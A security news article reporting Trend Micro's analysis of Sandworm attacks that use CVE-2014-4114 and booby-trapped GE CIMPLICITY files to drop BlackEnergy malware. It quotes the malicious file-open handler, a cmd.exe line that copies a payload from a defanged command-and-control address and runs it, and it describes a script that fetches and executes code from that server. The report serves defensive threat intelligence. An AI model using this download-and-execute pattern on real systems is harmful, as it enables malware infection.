Last week, the Sandworm team  was identified by researchers at iSight Partners\nas being at the center of attacks using CVE‐2014‐4114, a zero‐day vulnerability in Microsoft\nWindows, as part of an attack campaign. \n\"After beginning an investigation into the affiliated malware samples and domains, we quickly\ncame to realization that this group is very likely targeting SCADA‐centric victims who are\nusing GE Intelligent Platform’s CIMPLICITY HMI solution suite ,\" Trend Micro researchers Kyle\nWilhoit and Jim Gogolinski explained in a blog post . \"We have observed this team utilizing\n.cim and .bcl files as attack vectors, both of which file types are used by the CIMPLICITY\nsoftware. As further proof of the malware targeting CIMPILICITY, it drops files into the\nCIMPLICITY installation directory using the %CIMPATH% environment variable on the victim\nmachines.\"\nAccording to Trend Micro, the attackers were observed using emails armed with a malicious\nattachment that is opened by the CIMPLICITY application and attempts to exploit CVE‐2014‐\n4114 in Microsoft Windows. If the attack against the system running CIMPLICITY is successful,\nit attempts to download the Black Energy malware on the system. The spear‐phishing emails\nare spoofed to appear to come from Oleh Tiahnybok, a Ukrainian politician who has been\ncritical of Russia.  \nOne of the command and control servers that garnered Trend Micro's attention was\n94[.]185[.]85[.]122.\n\"We pivoted off this C2, and located a file called config.bak (SHA1 hash:\nc931be9cd2c0bd896ebe98c9304fea9e),\" the researchers explained. \"This file piqued our\ninterest right off the bat, because it is a CimEdit/CimView file. A CimEdit/CimView file is an\nobject oriented file for GE’s Cimplicity SCADA software suite, used to administer SCADA\ndevices.\nIn config.bak there are two defined events ‐ OnOpenExecCommand  and\nScreenOpenDispatch . According to Trend Micro, the handler of OnOpenExecCommand is the\nfollowing command line:\ncmd.exe /c \"copy \\\\94[.]185[.]85[.]122\\public\\default.txt \"%CIMPATH%\\CimCMSafegs.exe\" &&\nstart \"WOW64\" \"%CIMPATH%\\CimCMSafegs.exe\"\n\"It’s important to note the variable %CIMPATH% is used for the drop location of default.txt,\"\nthe researchers noted. \"This is a standard variable that Cimplicity uses for its installs. The\nhandler of ScreenOpenDispatch is the subroutine start(). The subroutine start() downloads the\nfile from hxxp://94[.]185[.]85[.]122/newsfeed.xml, saves and executes the downloaded file\nusing cscript.exe, deletes the file after execution, and terminates the current process.\"\nThe researchers noted that even though they are seeing CIMPLICITY being used as an attack\nvector, there is no indication attackers are manipulating any actual SCADA systems or data.\nHowever, since human‐to‐machine interfaces [HMIs] are located in both the corporate and\ncontrol networks, this attack could be used to target either network segment, or used to\ncross from the corporate to the control network, they wrote.\nCVE‐2014‐4114 was patched by Microsoft this month with MS14‐060.\nRelated : Hackers Breach White House Computer System\nRelated : FireEye Links Russia to Cyber Espionage Campaign Dating Back to 2007\n Search\nBusiness Email AddressSUBSCRIBE TO THE DAILY BRIEFING\n   \n   \n    \nMost Recent Most Read\nRansomware Is Mostly Deployed After Hours:\nReport\nThe Other Virus Threat: Surge in COVID‐Themed\nCyberattacks\nBarr: FBI Probing If Foreign Gov't Behind HHS\nCyber Incident\nTrend Micro Patches Two Vulnerabilities Exploited\nin the Wild\nFinancial Services Firms Exposed 500,000 Sensitive\nDocuments\nTech Companies Partner to Securely Connect IoT\nto Cloud\nPrivate Application Access Firm Axis Security\nEmerges From Stealth\nTwo Dozen Arrested for Laundering Funds From\nBEC, Other Scams\nUsers Complain About Windows Update That\nPatches SMBGhost Vulnerability\nSenate Votes to Renew Surveillance Powers,\nDelaying Changes\nPopular Topics\nInformation Security News\nIT Security News\nRisk Management\nCybercrime\nCloud Security\nApplication Security\nSmart Device Security\nSecurity Community\nIT Security Newsletters\nICS Cyber Security Conference\nCISO Forum, Presented by Intel\nInfosecIsland.Com\nStay Intouch\nTwitter\nFacebook\nLinkedIn Group\nCyber Weapon Discussion\nGroup\nRSS Feed\nSubmit Tip\nSecurity Intelligence Group\nAbout SecurityWeek\nTeam\nAdvertising\nEvents\nWriting Opportunities\nFeedback\nContact Us\nCopyright © 2020 Wired Business Media.
